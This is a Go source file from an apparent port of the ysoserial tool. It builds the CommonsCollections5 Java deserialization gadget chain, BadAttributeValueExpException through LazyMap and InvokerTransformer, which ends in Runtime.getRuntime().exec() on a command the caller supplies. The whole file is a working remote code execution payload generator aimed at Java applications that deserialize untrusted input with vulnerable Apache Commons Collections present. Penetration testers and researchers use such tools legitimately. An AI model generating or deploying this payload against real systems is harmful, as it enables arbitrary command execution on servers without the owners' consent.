package ysoserial

func CommonsCollections5(cmd string) []byte {
	return ClassObject{
		name:             "javax.management.BadAttributeValueExpException",
		serialVersionUID: -3105272988410493376,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{"Ljava/lang/Object;", "val", ClassObject{
				name:             "org.apache.commons.collections.keyvalue.TiedMapEntry",
				serialVersionUID: -8453869361373831205,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Object;", "key", "foo"},
					{"Ljava/util/Map;", "map", ClassObject{
						name:             "org.apache.commons.collections.map.LazyMap",
						serialVersionUID: 7990956402564206740,
						classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
						fields: []Field{
							{"Lorg/apache/commons/collections/Transformer;", "factory", ClassObject{
								name:             "org.apache.commons.collections.functors.ChainedTransformer",
								serialVersionUID: 3514945074733160196,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Lorg/apache/commons/collections/Transformer;", "iTransformers", ArrayObject{
										name:             "[Lorg.apache.commons.collections.Transformer;",
										serialVersionUID: -4803604734341277543,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											ClassObject{
												name:             "org.apache.commons.collections.functors.ConstantTransformer",
												serialVersionUID: 6374440726369055124,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"Ljava/lang/Object;", "iConstant", ClassDesc{
														name:             "java.lang.Runtime",
														serialVersionUID: 0,
														classDescFlags:   0x00,
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														name:             "[Ljava.lang.Object;",
														serialVersionUID: -8012369246846506644,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															"getRuntime", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																values:           interfaces(),
																annotations:      interfaces(),
															},
														),
														annotations: interfaces(),
													},
													},
													{"Ljava/lang/String;", "iMethodName", "getMethod"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														name:             "[Ljava.lang.Class;",
														serialVersionUID: -6118465897992725863,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															ClassDesc{
																name:             "java.lang.String",
																serialVersionUID: -6849794470754667710,
																classDescFlags:   SC_SERIALIZABLE,
															}, ClassDesc{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
															},
														),
														annotations: interfaces(),
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														name:             "[Ljava.lang.Object;",
														serialVersionUID: -8012369246846506644,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															nil,
															ArrayObject{
																name:             "[Ljava.lang.Object;",
																serialVersionUID: -8012369246846506644,
																classDescFlags:   SC_SERIALIZABLE,
																values:           interfaces(),
																annotations:      interfaces(),
															},
														),
														annotations: interfaces(),
													},
													},
													{"Ljava/lang/String;", "iMethodName", "invoke"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														name:             "[Ljava.lang.Class;",
														serialVersionUID: -6118465897992725863,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															ClassDesc{
																name:             "java.lang.Object",
																serialVersionUID: 0,
																classDescFlags:   0x00,
															}, ClassDesc{
																name:             "[Ljava.lang.Object;",
																serialVersionUID: -8012369246846506644,
																classDescFlags:   SC_SERIALIZABLE,
															},
														),
														annotations: interfaces(),
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.InvokerTransformer",
												serialVersionUID: -8653385846894047688,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"[Ljava/lang/Object;", "iArgs", ArrayObject{
														name:             "[Ljava.lang.String;",
														serialVersionUID: -5921575005990323385,
														classDescFlags:   SC_SERIALIZABLE,
														values:           interfaces(cmd),
														annotations:      interfaces(),
													},
													},
													{"Ljava/lang/String;", "iMethodName", "exec"},
													{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
														name:             "[Ljava.lang.Class;",
														serialVersionUID: -6118465897992725863,
														classDescFlags:   SC_SERIALIZABLE,
														values: interfaces(
															ClassDesc{
																name:             "java.lang.String",
																serialVersionUID: -6849794470754667710,
																classDescFlags:   SC_SERIALIZABLE,
															},
														),
														annotations: interfaces(),
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}, ClassObject{
												name:             "org.apache.commons.collections.functors.ConstantTransformer",
												serialVersionUID: 6374440726369055124,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"Ljava/lang/Object;", "iConstant", ClassObject{
														name:             "java.lang.Integer",
														serialVersionUID: 1360826667806852920,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{Integer, "value", 1},
														},
														objectAnnotations: interfaces(),
														super: &ClassObject{
															name:              "java.lang.Number",
															serialVersionUID:  -8742448824652078965,
															classDescFlags:    SC_SERIALIZABLE,
															fields:            []Field{},
															objectAnnotations: interfaces(),
															super:             nil,
														},
													},
													},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											},
										),
										annotations: interfaces(),
									},
									},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							},
							},
						},
						objectAnnotations: interfaces(
							ClassObject{
								name:             "java.util.HashMap",
								serialVersionUID: 362498820763181265,
								classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
								fields: []Field{
									{Float, "loadFactor", 0.75},
									{Integer, "threshold", 0},
								},
								objectAnnotations: interfaces(
									blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
								),
								super: nil,
							},
						),
						super: nil,
					},
					},
				},
				objectAnnotations: interfaces(),
				super:             nil,
			},
			},
		},
		objectAnnotations: interfaces(),
		super: &ClassObject{
			name:              "java.lang.Exception",
			serialVersionUID:  -3387516993124229948,
			classDescFlags:    SC_SERIALIZABLE,
			fields:            []Field{},
			objectAnnotations: interfaces(),
			super: &ClassObject{
				name:             "java.lang.Throwable",
				serialVersionUID: -3042686055658047285,
				classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Throwable;", "cause", reference(0x7e0008)}, // refer self
					{"Ljava/lang/String;", "detailMessage", nil},
					{"[Ljava/lang/StackTraceElement;", "stackTrace", ArrayObject{
						name:             "[Ljava.lang.StackTraceElement;",
						serialVersionUID: 163864874655228473,
						classDescFlags:   SC_SERIALIZABLE,
						values: interfaces(
							ClassObject{
								name:             "java.lang.StackTraceElement",
								serialVersionUID: 6992337162326171013,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 81},
									{"Ljava/lang/String;", "declaringClass", "ysoserial.payloads.CommonsCollections5"},
									{"Ljava/lang/String;", "fileName", "CommonsCollections5.java"},
									{"Ljava/lang/String;", "methodName", "getObject"},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "java.lang.StackTraceElement",
								serialVersionUID: 6992337162326171013,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 51},
									{"Ljava/lang/String;", "declaringClass", "ysoserial.payloads.CommonsCollections5"},
									{"Ljava/lang/String;", "fileName", "CommonsCollections5.java"},
									{"Ljava/lang/String;", "methodName", "getObject"},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "java.lang.StackTraceElement",
								serialVersionUID: 6992337162326171013,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "lineNumber", 34},
									{"Ljava/lang/String;", "declaringClass", "ysoserial.GeneratePayload"},
									{"Ljava/lang/String;", "fileName", "GeneratePayload.java"},
									{"Ljava/lang/String;", "methodName", "main"},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							},
						),
						annotations: interfaces(),
					},
					},
					{"Ljava/util/List;", "suppressedExceptions", ClassObject{
						name:             "java.util.Collections$UnmodifiableList",
						serialVersionUID: -283967356065247728,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/util/List;", "list", ClassObject{
								name:             "java.util.ArrayList",
								serialVersionUID: 8683452581122892189,
								classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
								fields: []Field{
									{Integer, "size", 0},
								},
								objectAnnotations: interfaces(
									blockData{0x00, 0x00, 0x00, 0x00},
								),
								super: nil,
							},
							},
						},
						objectAnnotations: interfaces(),
						super: &ClassObject{
							name:             "java.util.Collections$UnmodifiableCollection",
							serialVersionUID: 1820017752578914078,
							classDescFlags:   SC_SERIALIZABLE,
							fields: []Field{
								{"Ljava/util/Collection;", "c", ClassObject{
									name:             "java.util.ArrayList",
									serialVersionUID: 8683452581122892189,
									classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
									fields: []Field{
										{Integer, "size", 0},
									},
									objectAnnotations: interfaces(
										blockData{0x00, 0x00, 0x00, 0x00},
									),
									super: nil,
								},
								},
							},
							objectAnnotations: interfaces(),
							super:             nil,
						},
					},
					},
				},
				objectAnnotations: interfaces(),
				super:             nil,
			},
		},
	}.SerializeWithMagicHeader()
}
